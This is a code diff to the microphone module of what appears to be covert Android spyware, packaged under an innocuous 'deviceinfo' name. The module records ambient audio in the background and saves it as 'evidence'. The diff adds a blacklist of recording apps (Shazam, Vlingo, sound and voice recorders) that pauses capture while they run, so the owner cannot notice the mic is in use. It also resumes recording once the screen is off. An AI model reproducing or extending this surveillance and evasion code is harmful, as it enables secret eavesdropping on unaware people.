@@ -11,7 +11,11 @@ package com.android.deviceinfo.module;
 
 import java.io.IOException;
 import java.io.InputStream;
+import java.util.HashSet;
+import java.util.Set;
 
+import android.content.Context;
+import android.media.AudioManager;
 import android.media.MediaRecorder;
 import android.media.MediaRecorder.OnErrorListener;
 import android.media.MediaRecorder.OnInfoListener;
@@ -20,15 +24,20 @@ import android.net.LocalSocket;
 import android.net.LocalSocketAddress;
 
 import com.android.deviceinfo.Call;
+import com.android.deviceinfo.ProcessInfo;
+import com.android.deviceinfo.ProcessStatus;
+import com.android.deviceinfo.Standby;
 import com.android.deviceinfo.StateRun;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.listener.ListenerCall;
+import com.android.deviceinfo.listener.ListenerProcess;
+import com.android.deviceinfo.listener.ListenerStandby;
 import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
@@ -48,11 +57,13 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 	private static final String TAG = "ModuleMic"; //$NON-NLS-1$
 	private static final long MIC_PERIOD = 5000;
-	// #!AMR[space] 
+	// #!AMR[space]
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
+	private static final int SUSPEND_CALL = 0;
+	private static StandByObserver standbyObserver;
 
 	int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };
-	
+
 	/** The recorder. */
 	MediaRecorder recorder;
 
@@ -68,11 +79,31 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	private String socketname;
 
 	boolean phoneListening;
+	private Observer<ProcessInfo> processObserver;
+
+	public Set<String> blacklist = new HashSet<String>();
+
+	public ModuleMic() {
+		super();
+		resetBlacklist();
+	}
+
+	public synchronized void resetBlacklist() {
+		blacklist.clear();
+		addBlacklist(M.e("shazam"));
+		addBlacklist(M.e("com.vlingo"));
+		addBlacklist(M.e("soundrecorder"));
+		addBlacklist(M.e("voicerecorder"));
+	}
+
+	public synchronized void addBlacklist(String black) {
+		blacklist.add(black);
+	}
 
 	public static ModuleMic self() {
 		return (ModuleMic) ManagerModule.self().get(M.e("mic"));
 	}
-	 
+
 	/*
 	 * (non-Javadoc)
 	 * 
@@ -98,8 +129,18 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 				Check.requires(status == StateRun.STARTING, "inconsistent status"); //$NON-NLS-1$
 			}
 
+			if (standbyObserver == null) {
+				standbyObserver = new StandByObserver(this);
+			}
+
 			addPhoneListener();
-			startRecorder();
+			if (Cfg.DEBUG) {
+				Check.asserts(standbyObserver != null, " (actualStop) Assert failed, null standbyObserver");
+			}
+			ListenerStandby.self().attach(standbyObserver);
+			if (canRecordMic()) {
+				startRecorder();
+			}
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "started");//$NON-NLS-1$
@@ -111,21 +152,11 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			}
 
 			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
-			}
-			if (Cfg.DEBUG) {
 				Check.log(TAG + " (begin) Error: " + e.toString());//$NON-NLS-1$
 			}
-		} catch (final IOException e) {
+		} catch (IOException e) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
-			}
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (begin) Error: " + e.toString());//$NON-NLS-1$
 			}
 		}
 	}
@@ -143,8 +174,12 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		if (Cfg.DEBUG) {
 			Check.requires(status == StateRun.STOPPING, "state not STOPPING"); //$NON-NLS-1$
 		}
+		if (Cfg.DEBUG) {
+			Check.asserts(standbyObserver != null, " (actualStop) Assert failed, null standbyObserver");
+		}
 
 		removePhoneListener();
+		ListenerStandby.self().detach(standbyObserver);
 		saveRecorderEvidence();
 		stopRecorder();
 
@@ -173,7 +208,13 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		}
 
 		if (numFailures < 10) {
-			saveRecorderEvidence();
+			try {
+				saveRecorderEvidence();
+			} catch (Exception ex) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualGo) Error: " + ex);
+				}
+			}
 
 		} else {
 			if (Cfg.DEBUG) {
@@ -196,6 +237,11 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			ListenerCall.self().attach(this);
 			phoneListening = true;
 		}
+
+		if (processObserver == null) {
+			processObserver = new ProcessObserver(this);
+		}
+		ListenerProcess.self().attach(processObserver);
 	}
 
 	private void removePhoneListener() {
@@ -203,15 +249,49 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			ListenerCall.self().detach(this);
 			phoneListening = false;
 		}
+
+		ListenerProcess.self().detach(processObserver);
+	}
+
+	@Override
+	public void notifyProcess(ProcessInfo b) {
+
+		AudioManager audioManager = (AudioManager) Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);
+		boolean headset = audioManager.isWiredHeadsetOn();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (notifyProcess) headset: " + headset);
+		}
+
+		for (String bl : blacklist) {
+			if (b.processInfo.contains(bl)) {
+				if (b.status == ProcessStatus.START) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (notifyProcess) blacklist started, " + b.processInfo);
+					}
+					suspend();
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (notifyProcess) blacklist stopped, " + b.processInfo);
+					}
+					resume();
+				}
+			}
+		}
 	}
 
 	int index = 0;
 	byte[] unfinished = null;
+	private boolean callOngoing;
 
 	private synchronized void saveRecorderEvidence() {
 
-		if (Cfg.DEBUG) {
-			Check.requires(recorder != null, "saveRecorderEvidence recorder==null"); //$NON-NLS-1$
+		if(recorder==null){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (saveRecorderEvidence) Error: recorder is null");
+				
+			}
+			numFailures += 1;
+			return;
 		}
 
 		byte[] chunk = getAvailable();
@@ -241,9 +321,10 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 					file.write(data);
 				}
 			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (saveRecorderEvidence): plain chunk, no bias");
-				}
+				// if (Cfg.DEBUG) {
+				// Check.log(TAG +
+				// " (saveRecorderEvidence): plain chunk, no bias");
+				// }
 				data = chunk;
 				if (Cfg.MICFILE) {
 					AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
@@ -257,6 +338,13 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			int pos = 0;
 			int chunklen = 0;
 			do {
+				if (pos >= data.length) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (saveRecorderEvidence) Error: strange pos");
+					}
+					numFailures += 1;
+					return;
+				}
 				chunklen = amr_sizes[(data[pos] >> 3) & 0x0f];
 				if (chunklen == 0) {
 					if (Cfg.DEBUG) {
@@ -275,7 +363,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveRecorderEvidence), data.length+1: " + (data.length + 1) + " pos: " + pos);
 			}
-			
+
 			if (pos > data.length + 1) {
 
 				// portion of microchunk to be saved for the next time
@@ -287,7 +375,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 					Check.log(TAG + " (saveRecorderEvidence): unfinishedLen = " + unfinishedLen + " unfPos: "
 							+ unfinishedPos + " chunklen: " + chunklen);
 				}
-				
+
 				unfinished = ByteArray.copy(data, unfinishedPos, data.length - unfinishedPos);
 				if (unfinished.length > 0) {
 					if (Cfg.DEBUG) {
@@ -297,10 +385,8 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 				}
 			}
 
-
-
 			if (data.length > 0) {
-				EvidenceReference.atomic(EvidenceType.MIC, getAdditionalData(), data);
+				EvidenceBuilder.atomic(EvidenceType.MIC, getAdditionalData(), data);
 			}
 
 		} else {
@@ -340,35 +426,6 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		}
 
 		return ret;
-	}
-
-	private void restartRecorder() {
-		try {
-			stopRecorder();
-			startRecorder();
-		} catch (final IllegalStateException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (restartRecorder) Error: " + e);//$NON-NLS-1$
-			}
-			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
-			}
-		} catch (final IOException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (restartRecorder) Error: " + e);//$NON-NLS-1$
-			}
-			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
-			}
-		}
 	}
 
 	/**
@@ -462,32 +519,31 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	 * Stop recorder.
 	 */
 	private synchronized void stopRecorder() {
-		if (Cfg.DEBUG) {
-			Check.requires(recorder != null, "null recorder"); //$NON-NLS-1$
-		}
-
+	
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (stopRecorder)");//$NON-NLS-1$
 		}
 
-		recorder.setOnErrorListener(null);
-		recorder.setOnInfoListener(null);
+		if (recorder != null) {
+			recorder.setOnErrorListener(null);
+			recorder.setOnInfoListener(null);
 
-		try {
-			recorder.stop();
-		} catch (Exception ex) {
-			if (Cfg.DEBUG) {
-				Check.log(ex);
+			try {
+				recorder.stop();
+			} catch (Exception ex) {
+				if (Cfg.DEBUG) {
+					Check.log(ex);
+				}
 			}
-		}
-		recorder.reset(); // You can reuse the object by going back to
-							// setAudioSource() step
-		// recorder.release(); // Now the object cannot be reused
-		getAvailable();
-		deleteSockets();
+			recorder.reset(); // You can reuse the object by going back to
+								// setAudioSource() step
+			// recorder.release(); // Now the object cannot be reused
+			getAvailable();
+			deleteSockets();
 
-		recorder.release();
-		recorder = null;
+			recorder.release();
+			recorder = null;
+		}
 
 	}
 
@@ -517,17 +573,45 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): call incoming, suspend");//$NON-NLS-1$
 			}
-
+			callOngoing = true;
 			suspend();
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): ");//$NON-NLS-1$
 			}
-
+			callOngoing = false;
 			resume();
 		}
 
 		return 1;
+	}
+
+	public int notification(Standby b) {
+		if (b.isScreenOff()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification) standby, resume mic");
+			}
+
+			resume();
+		} else {
+			if (isForegroundBlacklist()) {
+				suspend();
+			}
+		}
+		return 0;
+	}
+
+	private boolean isForegroundBlacklist() {
+		String foreground = Status.self().getForeground();
+		for (String bl : blacklist) {
+			if (foreground.contains(bl)) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (isForegroundBlacklist) found blacklist");
+				}
+				return true;
+			}
+		}
+		return false;
 	}
 
 	@Override
@@ -543,9 +627,35 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		}
 	}
 
+	private boolean canRecordMic() {
+		if (!Status.crisisMic() && !callOngoing) {
+			if (isForegroundBlacklist() && ListenerStandby.isScreenOn()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (resume) can't resume because of blacklist");
+				}
+				return false;
+			}
+
+			if (ModuleCall.self() != null && ModuleCall.self().isRecording()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (resume) can't switch on mic because call is on");
+				}
+				return false;
+			}
+			return true;
+		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (canRecordMic) crisis or call, cant rec");
+		}
+		return false;
+
+	}
+
 	@Override
 	public void resume() {
-		if (isSuspended()) {
+		if (isSuspended() && canRecordMic()) {
+
 			try {
 				startRecorder();
 			} catch (final IllegalStateException e) {
@@ -585,6 +695,11 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			Check.log(TAG + " (onError) Error: " + what);//$NON-NLS-1$
 		}
 
-		stopRecorder();
+		suspend();
+	}
+
+	public void stop() {
+		final ManagerModule moduleManager = ManagerModule.self();
+		moduleManager.stop(M.e("mic"));
 	}
 }
